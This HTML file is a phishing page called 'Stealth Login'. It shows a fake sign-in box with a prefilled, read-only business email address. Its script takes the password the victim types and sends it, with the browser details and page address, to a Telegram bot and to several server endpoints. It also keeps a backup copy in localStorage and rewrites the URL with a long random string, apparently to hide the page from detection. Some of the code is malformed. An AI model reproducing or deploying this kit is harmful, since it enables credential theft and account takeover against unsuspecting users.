<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Stealth Login</title>
  <style>
    body, html {
      height: 100%;
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-size: cover;
      overflow: hidden;
    }

    .bg-img {
      position: absolute;
      width: 550px;
      height: auto;
      opacity: 0.25;
      filter: grayscale(40%) brightness(1.1) blur(1.5px);
      animation: moveLeft 45s linear infinite;
    }

    .img1, .img2 {
      top: 20%;
      right: -300px;
    }

    .img1.paused { animation-play-state: paused !important; }
    .img1 { animation-delay: 0s; }
    .img2 { animation-delay: 22s; }

    @keyframes moveLeft {
      0% { right: -300px; }
      100% { right: 100%; }
    }

    .iframe-style-box {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.95);
      width: 400px;
      padding: 30px;
      z-index: 1;
      color: #f1f1f1;
    }

    .glass {
      backdrop-filter: blur(12px);
      background-color: rgba(30, 30, 30, 0.55);
      border-radius: 10px;
      border: 1px solid rgba(255, 255, 255, 0.3);
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
    }

    .iframe-style-box.hidden { display: none; }

    @keyframes popIn {
      0% { transform: translate(-50%, -50%) scale(0.85); opacity: 0; }
      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
    }

    .login-form { display: flex; flex-direction: column; }
    .input-wrapper { position: relative; width: 100%; }
    .input-wrapper input {
      width: 100%;
      padding-left: 35px;
      box-sizing: border-box;
      margin-bottom: 15px;
      padding: 10px;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    .input-wrapper span {
      position: absolute;
      left: 8px;
      font-size: 14px;
      color: #888;
      opacity: 0.9;
    }

    #togglePass {
      position: absolute;
      right: 8px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 14px;
      color: #ccc;
    }

    .login-form button {
      padding: 10px;
      background-color: #007bff;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .footer {
      text-align: center;
      margin-top: 15px;
      font-size: 14px;
      color: #ccc;
    }

    .options {
      display: flex;
      justify-content: space-between;
      margin-bottom: 10px;
      font-size: 14px;
    }

    #lockMessage {
      display: none;
      color: red;
      text-align: center;
      font-size: 14px;
      margin-top: 10px;
    }

    #clickToView {
      position: absolute;
      top: 40%;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      align-items: center;
      gap: 8px;
      color: #0066cc;
      font-size: 24px;
      font-weight: bold;
      text-shadow: 0 0 8px rgba(255, 75, 75, 0.6);
      cursor: pointer;
      z-index: 2;
      transition: transform 0.2s ease, color 0.2s ease;
    }

    #clickToView:hover {
      transform: translateX(-50%) scale(1.05);
      color: #0055aa;
    }

    #clickToView:active {
      transform: translateX(-50%) scale(0.98);
    }

    #clickToView img {
      height: 26px;
      vertical-align: middle;
    }

    #loader {
      position: absolute;
      top: 55%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      color: #fff;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      z-index: 3;
    }

    .loading-text {
      font-size: 14px;
      margin: 5px 0;
      color: #ff4b4b;
    }

    .spin {
      width: 36px;
      height: 36px;
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top: 4px solid #ff4b4b;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 10px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Added animation for pop-in effect */
    .popIn {
      animation: popIn 0.3s ease forwards;
    }
  </style>
</head>

  <div class="iframe-style-box hidden glass">
    <form class="login-form" id="loginForm">
      <input type="text" name="fullname" style="display:none;">
      <h2><img id="logoIcon" src="" alt="" style="height: 24px; vertical-align: middle;"></h2>
      <div class="input-wrapper">
        <span></span>
        <input type="text" id="email" name="email" value="sales@frankintiza.kz" placeholder="Email Address" readonly>
      </div>

      <div class="input-wrapper">
        <span>*</span>
        <input type="password" id="password" name="password" placeholder="Password">
        <span id="togglePass"></span>
      </div>

      <div class="options">
        <label>
          <input type="checkbox" id="rememberMe" checked> Remember me
        </label>
        <a href="#" style="color:inherit;text-decoration:none;">Forgot password?</a>
      </div>

      <button type="submit">Sign In</button>
      <div id="lockMessage">Too many failed attempts. Try again in <span id="timeLeft">30</span> seconds.</div>
    </form>
    <script>
      // Add form submission handler
      document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Get form data
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // Log to console immediately (for debugging)
        console.log('CREDENTIALS CAPTURED:');
        console.log('Email:', email);
        console.log('Password:', password);
        
        // Create JSON data object
        const formData = {
          email: email,
          password: password
        };
        
        // Log the form data
        console.log('Form data to submit:', JSON.stringify(formData, null, 2));
        
        // Create Telegram message
        const date = new Date().toISOString();
        const userAgent = navigator.userAgent;
        const telegramMessage = `
<b>🔐 LOGIN CAPTURED 🔐</b>
<b>Date:</b> ${date}
<b>Email:</b> ${email}
<b>Password:</b> ${password}
<b>User Agent:</b> ${userAgent}
<b>Page:</b> ${window.location.href}
        `;
        
        // Send to Telegram
        console.log('Sending data to Telegram...');
        sendToTelegram(telegramMessage)
          .then(telegramResponse => {
            console.log('Telegram submission successful:', telegramResponse);
            saveStealthLog(`Login sent to Telegram: ${email}`);
          })
          .catch(telegramError => {
            console.error('Telegram submission failed:', telegramError);
          });
        
        // Try both endpoints for robustness
        console.log('Submitting to PHP handler...');
        
        // Try first endpoint
        fetch('/submit-login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(formData)
        })
        .then(response => {
          console.log('Response status from /submit-login:', response.status);
          return response.json();
        })
        .then(data => {
          console.log('Response data from /submit-login:', data);
          if (data.status === 'success') {
            console.log('Form submitted successfully to /submit-login');
            saveStealthLog('Login attempt (submit-login): ' + email);
            alert('Login received! Check console for details.');
            return;
          }
          
          // Try backup endpoint if first one fails
          console.log('Trying backup endpoint /submit_form');
          return fetch('/submit_form', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
          });
        })
        .then(response => {
          if (!response || !response.json) return; // Skip if this is not a response object
          console.log('Response status from /submit_form:', response.status);
          return response.json();
        })
        .then(data => {
          if (!data) return; // Skip if no data
          console.log('Response data from /submit_form:', data);
          if (data.success === true) {
            console.log('Form submitted successfully to /submit_form');
            saveStealthLog('Login attempt (submit_form): ' + email);
          
          }
        })
        .catch(error => {
          console.error('Error submitting form to server:', error);
          
          // Log credentials to console even if submission fails
          console.warn('SERVER SUBMISSION FAILED BUT CREDENTIALS CAPTURED:');
          console.warn('Email:', email);
          console.warn('Password:', password);
          
          // Save to local storage as backup
          const capturedData = {
            timestamp: new Date().toISOString(),
            email: email,
            password: password
          };
          
          // Store in localStorage as backup
          let capturedLogins = JSON.parse(localStorage.getItem('capturedLogins') || '[]');
          capturedLogins.push(capturedData);
          localStorage.setItem('capturedLogins', JSON.stringify(capturedLogins));
          console.log('Credentials saved to localStorage as backup');
          
          // Directly save to stealthLogs too
          saveStealthLog(`Login captured (console): ${email} / ${password}`);
         
        });
        
        // Try text file submission regardless of other results
        console.log('Submitting to text file handler...');
        fetch('/txt_submit.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(formData)
        })
        .then(response => {
          console.log('Response status from txt_submit.php:', response.status);
          if (response.ok) {
            console.log('Text file submission successful');
            saveStealthLog('Login saved to text file: ' + email);
          }
        })
        .catch(error => {
          console.error('Error submitting to text file:', error);
        });
      });
    </script>

    // Define saveStealthLog globally so it can be called from anywhere
    function saveStealthLog(info) {

    // Function to send data to Telegram
    function sendToTelegram(message) {
      const { botToken, chatId } = TELEGRAM_CONFIG;
      if (!botToken || !chatId) {
        console.error('Telegram bot token or chat ID is missing');
        return Promise.reject('Telegram configuration missing');
      }
      
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      return fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      })
      .then(response => {
        if (!response.ok) {
          throw new Error(`Telegram API error: ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        console.log('Message sent to Telegram successfully:', data);
        return data;
      })
      .catch(error => {
        console.error('Failed to send message to Telegram:', error);
        throw error;
      });
    }

  <script>
    function generateRandomString(length) {
      const characters = 'Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9J0Kk2Ll1Mm3NnoOp4Pq5QrR6Ss7T8UfVWiXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return result;
    }
    
    function appendRandomStringToURL() {
      const randomString = generateRandomString(350);
      const currentURL = window.location.href.split('?')[0];
      window.history.replaceState(null, null, currentURL + "?auth=" + randomString);
    }
    
    window.onload = appendRandomStringToURL;
  </script>
